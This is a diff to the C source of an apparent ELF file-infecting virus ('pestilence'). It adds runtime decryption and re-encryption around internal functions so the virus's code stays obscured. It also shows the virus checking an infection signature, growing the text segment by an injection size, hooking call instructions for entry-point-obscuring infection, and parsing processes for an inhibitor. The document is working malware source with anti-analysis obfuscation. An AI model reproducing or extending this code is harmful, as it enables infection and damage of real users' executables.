@@ -1,6 +1,6 @@
 #include "pestilence.h"
 
-static int	update_index(t_fingerprint *fingerprint, t_info *info)
+int		update_index(t_fingerprint *fingerprint, t_info *info)
 {
 	Elf64_Phdr  *program_header;
 
@@ -18,17 +18,24 @@ static int	update_index(t_fingerprint *fingerprint, t_info *info)
 	return(1);
 }
 
-static int	check_magic(t_info *info, t_fingerprint *fingerprint)
+int		check_magic(t_info *info, t_fingerprint *fingerprint)
 {
-	void *addr;
+	void		*addr;
+	int		ret;
+	uint32_t	key;
 
 	addr = info->text_begin + info->text_size - SIGN_SIZE - 8;
 	if (*(uint32_t *)addr ==  MAGIC_VIRUS)
-		return (update_index(fingerprint, info));
+	{
+		key = decrypt_func(info, &update_index, info->tab_addr[1] - info->tab_addr[0], 0);
+	 	ret = update_index(fingerprint, info);
+		reencrypt_func(info, &update_index, info->tab_addr[1] - info->tab_addr[0], key);
+		return (ret);
+	}
 	return (0);
 }
 
-static size_t	get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_hp)
+size_t		get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_hp)
 {
 	Elf64_Phdr  *crawler;
 	int32_t     i;  
@@ -57,7 +64,7 @@ static size_t	get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_
 	return (next_offset - (program_header->p_offset + program_header->p_filesz));
 }
 
-static int	valid_call(t_info *info, int pos)
+int		valid_call(t_info *info, int pos)
 {
 	int32_t		dest;
 	uint32_t	prolog;
@@ -82,7 +89,7 @@ static int	valid_call(t_info *info, int pos)
 	return (1);
 }
 
-static void	patch_sections_header(t_info *info, size_t offset, size_t to_add)
+void		patch_sections_header(t_info *info, size_t offset, size_t to_add)
 {
 	Elf64_Ehdr 	*main_header;
 	Elf64_Shdr	*header;
@@ -120,9 +127,15 @@ int		find_text(t_info *info, t_fingerprint *fingerprint)
 			info->text_size = header->p_filesz;
 			if (info->text_begin + info->text_size > info->file + info->file_size)
 				return (1);
-			if (check_magic(info, fingerprint) == 1)
+			uint32_t key = decrypt_func(info, &check_magic, info->tab_addr[2] - info->tab_addr[1], 1);
+			int ret = check_magic(info, fingerprint);
+			reencrypt_func(info, &check_magic, info->tab_addr[2] - info->tab_addr[1], key);
+			if (ret == 1)
 				return (1);
-			if (get_padding_size(info, header, main_header->e_phnum) < INJECT_SIZE)
+			key = decrypt_func(info, &get_padding_size, info->tab_addr[3] - info->tab_addr[2], 2);
+			ret = get_padding_size(info, header, main_header->e_phnum);
+			reencrypt_func(info, &get_padding_size, info->tab_addr[3] - info->tab_addr[2], key);
+			if (ret < INJECT_SIZE)
 				return (1);
 			info->text_addr = header->p_vaddr;
 			header->p_filesz += INJECT_SIZE;
@@ -137,7 +150,7 @@ int		find_text(t_info *info, t_fingerprint *fingerprint)
 	return (0);
 }
 
-static void	hook_call(t_info *info, int32_t nb)
+void		hook_call(t_info *info, int32_t nb)
 {
 	int32_t	new_jmp;
 
@@ -147,7 +160,7 @@ static void	hook_call(t_info *info, int32_t nb)
 	ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
 }
 
-static void	patch_close_entries(t_info *info, int32_t nb)
+void		patch_close_entries(t_info *info, int32_t nb)
 {
 	uint32_t	origin;
 	uint32_t	addr_hook;
@@ -192,6 +205,7 @@ void		epo_parsing(t_info *info)
 
 	i = 0;
 	nb_call_detected = 0;
+	uint32_t key = decrypt_func(info, &valid_call, info->tab_addr[4] - info->tab_addr[3], 3);
 	while (i < info->text_size)
 	{
 		c = *((uint8_t *)(info->text_begin + i));
@@ -199,6 +213,7 @@ void		epo_parsing(t_info *info)
 			nb_call_detected++;
 		i++;
 	}
+	reencrypt_func(info, &valid_call, info->tab_addr[4] - info->tab_addr[3], key);
 	if (nb_call_detected < 50)
 	{
 		info->valid_target = 0;
@@ -211,6 +226,7 @@ void		epo_parsing(t_info *info)
 	to_infect[4] = (nb_call_detected * 4) / 5;
 	i = 0;
 	nb_call_detected = 0;
+	key = decrypt_func(info, &valid_call, info->tab_addr[4] - info->tab_addr[3], 3);
 	while (i < info->text_size && nb_call_detected <= to_infect[4])
 	{
 		c = *((uint8_t *)(info->text_begin + i));
@@ -228,6 +244,7 @@ void		epo_parsing(t_info *info)
 		}
 		i++;
 	}
+	reencrypt_func(info, &valid_call, info->tab_addr[4] - info->tab_addr[3], key);
 }
 
 int		pe_parsing(t_info *info)
@@ -258,7 +275,7 @@ int		pe_parsing(t_info *info)
 	return (0);
 }
 
-static int	parse_process(char *path, int pid_len, char *buf_inhibitor)
+int		parse_process(char *path, int pid_len, char *buf_inhibitor)
 {
 	int		fd;
 	char	buf_cast[12 + pid_len + 3];
